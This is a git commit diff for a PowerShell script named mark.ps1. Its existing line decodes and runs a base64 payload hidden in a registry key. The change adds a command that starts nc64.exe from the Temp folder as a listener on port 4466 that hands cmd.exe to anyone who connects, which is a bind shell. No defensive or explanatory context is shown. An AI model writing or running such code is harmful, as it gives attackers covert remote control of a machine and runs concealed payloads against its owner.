62c9f4668e98a9853c2de52f372831c0ec6d63a6
inwestallis <inwestallis@gmail.com>
2020-02-29 20:14:39 +0300

    Update mark.ps1

--- mark.ps1
+++ mark.ps1
@@ -1,1 +1,4 @@
 iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
+
+$Command = "%Temp%\nc64.exe -nLvp 4466 -e cmd.exe"
+Invoke-Expression $Command
